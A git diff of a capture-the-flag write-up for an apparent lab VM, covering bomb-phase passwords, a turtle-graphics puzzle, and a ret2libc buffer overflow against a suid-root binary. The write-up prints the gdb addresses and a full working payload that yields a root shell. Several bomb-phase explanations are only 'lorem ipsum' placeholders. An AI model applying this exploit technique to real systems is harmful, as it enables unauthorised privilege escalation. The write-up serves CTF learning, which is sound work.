@@ -1,4 +1,4 @@
-# Writeup 1
+# Writeup 1 - CTF mode
 
 ## Step 1 - Nmap
 
@@ -236,31 +236,31 @@ There we see a binary named **bomb**, and a README with some hints. The bomb has
 
 ### Phase 1
 
-ergerg
+lorem ipsum
 
 ### Phase 2
 
-ergegreg
+lorem ipsum
 
 ### Phase 3
 
-rgergerg
+lorem ipsum
 
 ### Phase 4
 
-ergegeg
+lorem ipsum
 
 ### Phase 5
 
-egregeg
+lorem ipsum
 
 ### Phase 6
 
-eergreg
+lorem ipsum
 
 ### Result
 
-Here is a summary of the passwords we found for the stages and the thor one at the end:
+Here is a summary of the passwords we found for the 6 stages and the combined one at the end:
 
 ```
 PHASE 1:    Public speaking is very easy.
@@ -279,25 +279,47 @@ However, this password doesn't work, and according to slack, we need to change `
 
 ## Step 9 - Thor / Turtle
 
+We use the second password to connect ourself as thor, and we see a README and a **turtle** file, which contains **instructions** to go **forward**, **backward**, **right or left** at certain angles.
 
-zaz password:
+We know that **Turtle** is a **Python feature** like a **drawing board**, which lets us command a turtle to draw all over it, which would fit with the file we found.
+
+So we wrote a **python script** to **translate** and **read the file with this feature**, and it **prints the word 'SLASH'** (see the script in our scripts folder).
+
+At the end of the turtle file, we see this message:
+
+```
+Can you digest the message? :)
+```
+
+So we can suppose we need to process it through a message digest algorithm like md5, which gives us: **646da671ca01bb5d84dbb5fb2238dc8e**
 
 ---
 
 ## Step 10 - Zaz / Exploit-me
 
-We can see a binary called 
-https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+We try the digest as zaz password and it works. We can see in his home folder a **binary** called **exploit-me**, and we see it **copies** the **input** we give it as the first argument **on its stack without verification**.
+
+We use both the pattern generator on this website: https://wiremask.eu/tools/buffer-overflow-pattern-generator/? and gdb to calculate the offset of bytes after which the program segfaults/rewrite on eip, and it's 140.
+
+We use a **ret2libc attack** to open a shell as root, since **exploit-me** is **owned by root** and has the **suid**.
 
 ```
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 (gdb) find 0xb7e6b060, +9999999, "/bin/sh"
 0xb7f8cc58
-
 ```
 
+The system address will replace the eip, and the "/bin/sh" address will be use as its argument.
+We now need to write these addresses in little endian, so here is our payload:
+
 ```
-zaz@BornToSecHackMe:~$ python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "AAAA" + "\x58\xcc\xf8\xb7"' > test
-zaz@BornToSecHackMe:~$ ./exploit_me $(cat test)
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "AAAA" + "\x58\xcc\xf8\xb7"')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��AAAAX���
+# whoami
+root
+# id  
+uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
 ```
+
+And we are root!
